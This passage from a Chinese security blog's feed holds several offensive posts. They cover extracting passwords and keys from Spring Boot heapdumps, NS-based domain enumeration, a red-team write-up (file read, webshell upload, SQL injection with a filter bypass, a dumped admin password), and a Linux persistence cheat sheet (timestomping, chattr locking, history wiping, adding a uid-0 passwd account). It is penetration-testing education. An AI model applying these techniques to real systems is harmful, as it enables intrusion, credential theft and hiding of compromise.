class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> java.util.Hashtable$Entry x <span class="keyword">WHERE</span> (toString(x.key).contains(<span class="string">&quot;user&quot;</span>)) <span class="keyword">or</span> (toString(x.key).contains(<span class="string">&quot;pass&quot;</span>))</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/5df2b9f8fa8e84a9dbbef6363475626fa12702.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/5df2b9f8fa8e84a9dbbef6363475626fa12702.png" srcset="data:image/png;base64,666" alt="spring%20boot%E4%B9%8Bheapdump%20d36d51fecf994d9193156304740f3cad/Untitled%205.png"></p><p>拓展一下也可以直接搜accessKey</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> java.util.Hashtable$Entry x <span class="keyword">WHERE</span> (toString(x.key).contains(<span class="string">&quot;accessKey&quot;</span>))</span><br></pre></td></tr></table></figure><p>我这个里面没有。。。</p><p><img src="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/3c48cca592674668d417121f85ed978c17ec01.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/3c48cca592674668d417121f85ed978c17ec01.png" srcset="data:image/png;base64,666" alt="spring%20boot%E4%B9%8Bheapdump%20d36d51fecf994d9193156304740f3cad/Untitled%206.png"></p><p>借一张xray社区的图</p><p><img src="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/b2ea9a70d7eb8276300ec6594f9515307248e9.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/b2ea9a70d7eb8276300ec6594f9515307248e9.png" srcset="data:image/png;base64,666" alt="spring%20boot%E4%B9%8Bheapdump%20d36d51fecf994d9193156304740f3cad/Untitled%207.png"></p><p><img src="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/14093a7079ba0d34b2015fc5a20a6990a1df5c.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/14093a7079ba0d34b2015fc5a20a6990a1df5c.png" srcset="data:image/png;base64,666" alt="spring%20boot%E4%B9%8Bheapdump%20d36d51fecf994d9193156304740f3cad/Untitled%208.png"></p><p>wx，app等等。。。都可以搜</p><p>还有一种查看方式就是通过 Top Consumers  </p><p><img src="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/2148221dc5bcb4b4fe83851eb932bd7e3b2be3.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/2148221dc5bcb4b4fe83851eb932bd7e3b2be3.png" srcset="data:image/png;base64,666" alt="spring%20boot%E4%B9%8Bheapdump%20d36d51fecf994d9193156304740f3cad/Untitled%209.png"></p><p>然后根据包的结构去查看自己感兴趣的东西，比如我此处的 druid</p><p><img src="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/c9f7d2b714d1a6e5ccebd992400dee56251a06.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/c9f7d2b714d1a6e5ccebd992400dee56251a06.png" srcset="data:image/png;base64,666" alt="spring%20boot%E4%B9%8Bheapdump%20d36d51fecf994d9193156304740f3cad/Untitled%2010.png"></p><p>比如此处就能看到一台sqlserver的连接信息（ip，账号，密码）。</p><p><img src="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/5e9ef7ff0b7f54fbe10395a61fceedc7d1c339.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/5e9ef7ff0b7f54fbe10395a61fceedc7d1c339.png" srcset="data:image/png;base64,666" alt="spring%20boot%E4%B9%8Bheapdump%20d36d51fecf994d9193156304740f3cad/Untitled%2011.png"></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://mp.weixin.qq.com/s/YirHAXg3VZXA3Znj4L6xSw">记一次信息泄漏到RCE</a></p><p><a href="https://blog.csdn.net/yrwan95/article/details/82826066">Eclipse Memory Analyzer —— MAT查找内存泄漏工具</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;准备工作&quot;&gt;&lt;a href=&quot;#准备工作&quot; class=&quot;headerlink&quot; title=&quot;准备工作&quot;&gt;&lt;/a&gt;准备工作&lt;/h2&gt;&lt;p&gt;首先要获取heapdump。从&lt;a href=&quot;http://www.xx.com/heapdump%E8%8E%B7%E5</summary>
      
    
    
    
    <category term="web安全" scheme="https://canc3s.github.io/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="web" scheme="https://canc3s.github.io/tags/web/"/>
    
    <category term="java" scheme="https://canc3s.github.io/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>通过NS服务器收集域名</title>
    <link href="https://canc3s.github.io/2020/12/30/%E9%80%9A%E8%BF%87NS%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%94%B6%E9%9B%86%E5%9F%9F%E5%90%8D/"/>
    <id>https://canc3s.github.io/2020/12/30/%E9%80%9A%E8%BF%87NS%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%94%B6%E9%9B%86%E5%9F%9F%E5%90%8D/</id>
    <published>2020-12-30T15:30:04.000Z</published>
    <updated>2021-01-30T16:19:38.956Z</updated>
    
    <content type="html"><![CDATA[<h1 id="通过NS服务器收集域名"><a href="#通过NS服务器收集域名" class="headerlink" title="通过NS服务器收集域名"></a>通过NS服务器收集域名</h1><p>其技术原理是向dns发送一个解析请求，看是否有返回ns信息，如果有的话将会使用该ns信息与历史沉淀下的dns数据信息进行交叉对比，最后返回一个n个不同的域名使用同一个ns服务器的列表。</p><p>这种域名收集方式比较适合有自建DNS服务器且有大量一级域名的大型企业。比如，BAT。</p><h1 id="利用手段"><a href="#利用手段" class="headerlink" title="利用手段"></a>利用手段</h1><blockquote><p>以百度为例</p></blockquote><p>首先通过nslookup，查询到一些已知域名的NS服务器。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nslookup</span><br><span class="line"><span class="built_in">set</span> <span class="built_in">type</span>=ns</span><br></pre></td></tr></table></figure><p>通过已知的一些一级域名，查询出该公司在使用的一些ns服务器。</p><p><img src="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/9a261c1865475b84141e0f60bc3966f4cf189d.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/9a261c1865475b84141e0f60bc3966f4cf189d.png" srcset="data:image/png;base64,666" alt="%E9%80%9A%E8%BF%87NS%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%94%B6%E9%9B%86%E5%9F%9F%E5%90%8D%2031be770fd2084612a3ee7be03b60ee08/Untitled.png"></p><p><img src="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/4ededda89b3bf01d5bd7745257be2a266b0e80.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/4ededda89b3bf01d5bd7745257be2a266b0e80.png" srcset="data:image/png;base64,666" alt="%E9%80%9A%E8%BF%87NS%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%94%B6%E9%9B%86%E5%9F%9F%E5%90%8D%2031be770fd2084612a3ee7be03b60ee08/Untitled%201.png"></p><p><img src="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/bbee0056d2d1596b1f592121c3c5cd34ec8e88.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/bbee0056d2d1596b1f592121c3c5cd34ec8e88.png" srcset="data:image/png;base64,666" alt="%E9%80%9A%E8%BF%87NS%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%94%B6%E9%9B%86%E5%9F%9F%E5%90%8D%2031be770fd2084612a3ee7be03b60ee08/Untitled%202.png"></p><p>当然也要注意有些一级域名可以并不是用的自己的NS服务器，还需要进一步判断</p><p><img src="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/438df4a7c0d0f19e24b56db9a7097b35052129.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/438df4a7c0d0f19e24b56db9a7097b35052129.png" srcset="data:image/png;base64,666" alt="%E9%80%9A%E8%BF%87NS%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%94%B6%E9%9B%86%E5%9F%9F%E5%90%8D%2031be770fd2084612a3ee7be03b60ee08/Untitled%203.png"></p><p><img src="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/66107557d673972dcd1055dc3ec500de5cc808.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/66107557d673972dcd1055dc3ec500de5cc808.png" srcset="data:image/png;base64,666" alt="%E9%80%9A%E8%BF%87NS%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%94%B6%E9%9B%86%E5%9F%9F%E5%90%8D%2031be770fd2084612a3ee7be03b60ee08/Untitled%204.png"></p><p>然后整理收集到的NS服务器</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">dns.baidu.com</span><br><span class="line">ns1.baidu.com</span><br><span class="line">ns2.baidu.com</span><br><span class="line">...</span><br><span class="line">sv1.bdydns.cn</span><br><span class="line">sv2.bdydns.cn</span><br><span class="line">sv3.bdydns.cn</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>然后利用ns服务器历史解析记录的调用接口一一查询</p><ul><li><p>查找ns服务器的免费接口调用地址:</p><p>  <a href="https://api.hackertarget.com/findshareddns/?q=ns1.dnsserver.com">https://api.hackertarget.com/findshareddns/?q=ns1.dnsserver.com</a></p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/18ccc7c88dd28162c0092116732040ee3ec106.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/18ccc7c88dd28162c0092116732040ee3ec106.png" srcset="data:image/png;base64,666" alt="%E9%80%9A%E8%BF%87NS%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%94%B6%E9%9B%86%E5%9F%9F%E5%90%8D%2031be770fd2084612a3ee7be03b60ee08/Untitled%205.png"></p><p>然后，整理，去重，验证是否真的是该公司资产。</p><h1 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h1><ol><li>越大型的互联网公司，效果越好</li><li>大部分ns服务器都有命名规律，如<code>ns1</code>,<code>ns2</code>……</li><li>有时候公司虽然有自己的dns服务器，但是仍然会使用一些服务器厂商的dns</li><li>存在并不是该公司的资产，但仍然解析到该公司dsn服务器的情况。（数量不多）</li><li>因为存在上面两种情况，所以写自动化脚本递归查询时需要增加验证。</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;通过NS服务器收集域名&quot;&gt;&lt;a href=&quot;#通过NS服务器收集域名&quot; class=&quot;headerlink&quot; title=&quot;通过NS服务器收集域名&quot;&gt;&lt;/a&gt;通过NS服务器收集域名&lt;/h1&gt;&lt;p&gt;其技术原理是向dns发送一个解析请求，看是否有返回ns信息，如果有的</summary>
      
    
    
    
    <category term="资产收集" scheme="https://canc3s.github.io/categories/%E8%B5%84%E4%BA%A7%E6%94%B6%E9%9B%86/"/>
    
    
    <category term="信息收集" scheme="https://canc3s.github.io/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
    <category term="域名" scheme="https://canc3s.github.io/tags/%E5%9F%9F%E5%90%8D/"/>
    
  </entry>
  
  <entry>
    <title>12月内部红蓝</title>
    <link href="https://canc3s.github.io/2020/12/26/12%E6%9C%88%E5%86%85%E9%83%A8%E7%BA%A2%E8%93%9D/"/>
    <id>https://canc3s.github.io/2020/12/26/12%E6%9C%88%E5%86%85%E9%83%A8%E7%BA%A2%E8%93%9D/</id>
    <published>2020-12-26T15:30:04.000Z</published>
    <updated>2021-01-30T16:28:55.476Z</updated>
    
    <content type="html"><![CDATA[<h1 id="12月内部红蓝"><a href="#12月内部红蓝" class="headerlink" title="12月内部红蓝"></a>12月内部红蓝</h1><h2 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h2><p>在12月的一个周末内部攻防群里发来了，攻防vpn信息和目标网站的域名。通过使用nmap扫描端口发现一共有两个正常的网站，一个是全球车辆定位系统</p><p><img src="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/24b49aa9cec6b6ccedf03d20adf578315c88b4.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/24b49aa9cec6b6ccedf03d20adf578315c88b4.png" srcset="data:image/png;base64,666" alt="Untitled.png"></p><p>另一个是用zblog搭建的一个博客通知系统。</p><p><img src="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/040482903489285784bbb84a75769d1bf838b7.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/040482903489285784bbb84a75769d1bf838b7.png" srcset="data:image/png;base64,666" alt="Untitled%201.png"></p><p>通过简单的猜测找到博客系统的后台后件但测试了几个弱口令没有进去，然后就去看另一个站了。乍一看，是个全“静态“网站，直接放一个图片在网站上，是攻防比赛时某些防守方的惯用手段，只有一个登陆可以点，但是点击登陆后返回功能被废弃。</p><p>正当感觉这个网站一个功能点没有，可以回去看之前那个站时，刷新网站有一条流量引起了我的注意。</p><p><img src="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/408c28a9030802f8ebc14e2a1baa8c52a6f28e.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/408c28a9030802f8ebc14e2a1baa8c52a6f28e.png" srcset="data:image/png;base64,666" alt="Untitled%202.png"></p><p>看这个参数感觉像是有任意文件读取的样子，经过尝试发现确实是个最经典的任意文件读取。去读shadow没读出来，但可以读出来root的history文件，还有不少收获，顺势读了第一个flag。</p><p><img src="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/0c916d0793929201cd7a00a69b52b660194471.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/0c916d0793929201cd7a00a69b52b660194471.png" srcset="data:image/png;base64,666" alt="Untitled%203.png"></p><p><img src="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/821dc625952fb97782966d49968e841988ed6d.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/821dc625952fb97782966d49968e841988ed6d.png" srcset="data:image/png;base64,666" alt="Untitled%204.png"></p><p>虽然history里有操作备份文件的记录，但是我没猜到备份文件在哪，然后，准备读读网站有些什么文件，看有没有别的利用点时，发现网站竟然还有目录遍历。。</p><p><img src="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/51cbf0f1ea4a9f48a3c1f11348f2af2d96afea.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/51cbf0f1ea4a9f48a3c1f11348f2af2d96afea.png" srcset="data:image/png;base64,666" alt="Untitled%205.png"></p><p>发现不明文件一个，用任意文件读取后发现是一句话，后来一看文件创建时间后感觉应该有别的大佬已经捷足先登了，那我就顺势骑马拿站了。</p><p><img src="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/ab4f8f8b70b2d104a2f888e5350c9dddfdb867.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/ab4f8f8b70b2d104a2f888e5350c9dddfdb867.png" srcset="data:image/png;base64,666" alt="Untitled%206.png"></p><p>当时没注意到php7直接去拿菜刀和蚁剑去连了，没连上，所以后面一段操作其实都是直接用hackbar操作的。因为set_magic_quotes_runtime的原因，大部分的一句话连接工具都连不上php7的一句话shell（但我最后用有一版C刀连上了。。。老工具都是神器 🤨）</p><p>然后在<code>/root/</code>下找到了第二个flag，找到了多个网站备份文件，其中一个是zblog。</p><p><img src="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/778f8faf8f0005e129a6ff02472e8f0194282e.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/778f8faf8f0005e129a6ff02472e8f0194282e.png" srcset="data:image/png;base64,666" alt="Untitled%207.png"></p><p>利用文件读取下载下来后，解压发现了惊喜——后台账号密码。</p><p><img src="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/e54a16eba35dac423af4c29caa5ac4b31be39c.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/e54a16eba35dac423af4c29caa5ac4b31be39c.png" srcset="data:image/png;base64,666" alt="Untitled%208.png"></p><p>进入后台就是老套路了，网站设置修改网站上传文件的白名单，附件上传处上传webshell，成功getshell，没有任何过滤和waf，一气呵成。</p><p><img src="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/0f54b9e32ed0a19a6d7232fcadf9b0c73d1178.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/0f54b9e32ed0a19a6d7232fcadf9b0c73d1178.png" srcset="data:image/png;base64,666" alt="Untitled%209.png"></p><p><img src="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/e7c2554c838beac231fd48fc0226e5dbc15b9a.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/e7c2554c838beac231fd48fc0226e5dbc15b9a.png" srcset="data:image/png;base64,666" alt="Untitled%2010.png"></p><p><img src="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/cd59e2c5759d048cb66e81830e7c7eb4ee25d8.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/cd59e2c5759d048cb66e81830e7c7eb4ee25d8.png" srcset="data:image/png;base64,666" alt="Untitled%2011.png"></p><p>紧接着也是常规操作，抓密码（Administrator:<a href="mailto:&#x77;&#97;&#x6e;&#103;&#x77;&#x65;&#x69;&#x40;&#x31;&#48;&#x30;&#46;&#50;&#x30;&#51;">&#x77;&#97;&#x6e;&#103;&#x77;&#x65;&#x69;&#x40;&#x31;&#48;&#x30;&#46;&#50;&#x30;&#51;</a>），登陆rdp，发现第三个flag。</p><p><img src="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/671b43620e492d0a221a1b4db136e0e76e5364.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/671b43620e492d0a221a1b4db136e0e76e5364.png" srcset="data:image/png;base64,666" alt="Untitled%2012.png"></p><p>上面那个全球车辆定位系统为什么当时没有用一句话写个自己的shell其实是因为php权限比较低，web目录没有写权限，然后通过猜密码成功登陆172.16.100.203，内网以ip地址为变量的密码还是特别常见的。</p><p><img src="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/d65ec99fc68868594305944cf1bc2405d1cc3b.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/d65ec99fc68868594305944cf1bc2405d1cc3b.png" srcset="data:image/png;base64,666" alt="Untitled%2013.png"></p><h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><p>通过netstat发现172.16.100.203机器和192.168.0.101有链接。扫端口发现只有22和80开启。尝试猜密码去连接101试图直接shell，结果失败了。访问80端口</p><p><img src="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/e5e33c779b727c2ad9bba29ef1488b3e0300d8.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/e5e33c779b727c2ad9bba29ef1488b3e0300d8.png" srcset="data:image/png;base64,666" alt="Untitled%2014.png"></p><p>点击帮助手册时发现了一条流量疑似有注入点</p><p><img src="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/e6f7d6ca93b5d34c855e5b5ce6fc2c5a50188b.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/e6f7d6ca93b5d34c855e5b5ce6fc2c5a50188b.png" srcset="data:image/png;base64,666" alt="Untitled%2015.png"></p><p>经过简单的测试发现确实是注入点，int类型。但。。好像过滤了蛮多关键字</p><p><img src="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/f3f2593aad809ceb00bb9f7eaf31a0795d0715.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/f3f2593aad809ceb00bb9f7eaf31a0795d0715.png" srcset="data:image/png;base64,666" alt="Untitled%2016.png"></p><p>经过尝试，发现关键字进行部分url编码后就可直接过滤，然后设置burp替换规则就可以sqlmap一把梭了。</p><p><img src="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/ec8044901a29aa3dda090e93237516b4d0e172.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/ec8044901a29aa3dda090e93237516b4d0e172.png" srcset="data:image/png;base64,666" alt="Untitled%2017.png"></p><p><img src="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/776a91b896e929d905137e7ee7b31e5fd5e113.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/776a91b896e929d905137e7ee7b31e5fd5e113.png" srcset="data:image/png;base64,666" alt="Untitled%2018.png"></p><p>一开始注数据时发现ua_info表中数据和user_info表中的用户一样，所以就只跑了ua_info表中的数据，发现四个用户hash都解不开，然后尝试了截取前16位也没成功。后来山穷水尽之时，dump了user_info表中的数据，发现user_info表中有五个用户，第五个用户密码刚好能解开。</p><p><img src="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/f97337a769cfcb0f6df3f5ac04f8f6db1e7ef4.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/f97337a769cfcb0f6df3f5ac04f8f6db1e7ef4.png" srcset="data:image/png;base64,666" alt="Untitled%2019.png"></p><p>然后登陆成功又获取一个flag</p><p><img src="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/67e9954b6288abc986a29fd963bff0d5bdbf76.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/67e9954b6288abc986a29fd963bff0d5bdbf76.png" srcset="data:image/png;base64,666" alt="Untitled%2020.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;12月内部红蓝&quot;&gt;&lt;a href=&quot;#12月内部红蓝&quot; class=&quot;headerlink&quot; title=&quot;12月内部红蓝&quot;&gt;&lt;/a&gt;12月内部红蓝&lt;/h1&gt;&lt;h2 id=&quot;任意文件读取&quot;&gt;&lt;a href=&quot;#任意文件读取&quot; class=&quot;headerlink&quot; </summary>
      
    
    
    
    <category term="内部红蓝记录" scheme="https://canc3s.github.io/categories/%E5%86%85%E9%83%A8%E7%BA%A2%E8%93%9D%E8%AE%B0%E5%BD%95/"/>
    
    
    <category term="web" scheme="https://canc3s.github.io/tags/web/"/>
    
    <category term="sqli" scheme="https://canc3s.github.io/tags/sqli/"/>
    
    <category term="内部红蓝" scheme="https://canc3s.github.io/tags/%E5%86%85%E9%83%A8%E7%BA%A2%E8%93%9D/"/>
    
  </entry>
  
  <entry>
    <title>Linux 权限维持整理</title>
    <link href="https://canc3s.github.io/2020/07/20/Linux-%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%95%B4%E7%90%86/"/>
    <id>https://canc3s.github.io/2020/07/20/Linux-%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%95%B4%E7%90%86/</id>
    <published>2020-07-20T15:30:04.000Z</published>
    <updated>2021-02-03T11:19:13.713Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>大部分来自网上，整理的笔记</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/c71bea1a3cacfb608ed0c11558f2644e919.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/c71bea1a3cacfb608ed0c11558f2644e919.png" srcset="data:image/png;base64,666" alt="img"></p><h3 id="修改文件-终端属性"><a href="#修改文件-终端属性" class="headerlink" title="修改文件/终端属性"></a>修改文件/终端属性</h3><h4 id="1-文件创建时间"><a href="#1-文件创建时间" class="headerlink" title="1. 文件创建时间"></a>1. 文件创建时间</h4><p>如果蓝队根据文件修改时间来判断文件是否为后门，如参考index.php的时间再来看shell.php的时间就可以判断shell.php的生成时间有问题。</p><p>解决方法：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">touch -r index.php shell.php</span><br></pre></td></tr></table></figure><p>touch命令用于修改文件或者目录的时间属性，包括存取时间和更改时间。若文件不存在，系统会建立一个新的文件。</p><h4 id="2-文件锁定"><a href="#2-文件锁定" class="headerlink" title="2. 文件锁定"></a>2. 文件锁定</h4><p>在Linux中，使用chattr命令来防止root和其他管理用户误删除和修改重要文件及目录，此权限用ls -l是查看不出来的，从而达到隐藏权限的目的。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">chattr +i evil.php  <span class="comment">#锁定文件</span></span><br><span class="line">rm -rf evil.php     <span class="comment">#提示禁止删除</span></span><br><span class="line"></span><br><span class="line">lsattr  evil.php    <span class="comment">#属性查看</span></span><br><span class="line">chattr -i evil.php  <span class="comment">#解除锁定</span></span><br><span class="line">rm -rf evil.php     <span class="comment">#彻底删除文件</span></span><br></pre></td></tr></table></figure><h4 id="3-历史操作命令"><a href="#3-历史操作命令" class="headerlink" title="3. 历史操作命令"></a>3. 历史操作命令</h4><p>在shell中执行的命令，不希望被记录在命令行历史中，如何在linux中开启无痕操作模式呢？</p><p>技巧一：只针对你的工作关闭历史记录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[space]<span class="built_in">set</span> +o <span class="built_in">history</span>  <span class="comment">#备注：[space] 表示空格。并且由于空格的缘故，该命令本身也不会被记录</span></span><br></pre></td></tr></table></figure><p>上面的命令会临时禁用历史功能，这意味着在这命令之后你执行的所有操作都不会记录到历史中，然而这个命令之前的所有东西都会原样记录在历史列表中。</p><p>要重新开启历史功能，执行下面的命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[Space]<span class="built_in">set</span> -o <span class="built_in">history</span>  <span class="comment">#将环境恢复原状</span></span><br></pre></td></tr></table></figure><p>技巧二：从历史记录中删除指定的命令</p><p>假设历史记录中已经包含了一些你不希望记录的命令。这种情况下我们怎么办？很简单。通过下面的命令来删除：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">history</span> | grep <span class="string">&quot;keyword&quot;</span></span><br></pre></td></tr></table></figure><p>输出历史记录中匹配的命令，每一条前面会有个数字。从历史记录中删除那个指定的项：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">history</span> -d [num]</span><br></pre></td></tr></table></figure><p>删除大规模历史操作记录，这里，我们只保留前150行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed -i <span class="string">&#x27;150,$d&#x27;</span> .bash_history</span><br></pre></td></tr></table></figure><h4 id="4-passwd写入"><a href="#4-passwd写入" class="headerlink" title="4. passwd写入"></a>4. passwd写入</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/etc/passwd 各部分含义：</span><br><span class="line">用户名：密码：用户ID：组ID：身份描述：用户的家目录：用户登录后所使用的SHELL</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/etc/shadow 各部分含义：</span><br><span class="line">用户名：密码的MD5加密值：自系统使用以来口令被修改的天数：口令的最小修改间隔：口令更改的周期：口令失效的天数：口令失效以后帐号会被锁定多少天：用户帐号到期时间：保留字段尚未使用 </span><br></pre></td></tr></table></figure><p>写入举例：</p><p>1.增加超级用户</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$perl</span> -le <span class="string">&#x27;print crypt(&quot;momaek&quot;,&quot;salt&quot;)&#x27;</span></span><br><span class="line">savbSWc4rx8NY</span><br><span class="line"></span><br><span class="line"><span class="variable">$echo</span> <span class="string">&quot;root2:WVLY0mgH0RtUI:0:0:root:/root:/bin/bash&quot;</span> &gt;&gt; /etc/passwd</span><br></pre></td></tr></table></figure><p>2.如果系统不允许uid=0的用户远程登录，可以增加一个普通用户账号</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;momaek:savbSWc4rx8NY:-1:-1:-1:-1:-1:-1:500&quot;</span> &gt;&gt; /etc/shadow</span><br></pre></td></tr></table></figure><h3 id="SUID后门"><a href="#SUID后门" class="headerlink" title="SUID后门"></a>SUID后门</h3><p>当一个文件所属主的x标志位s(set 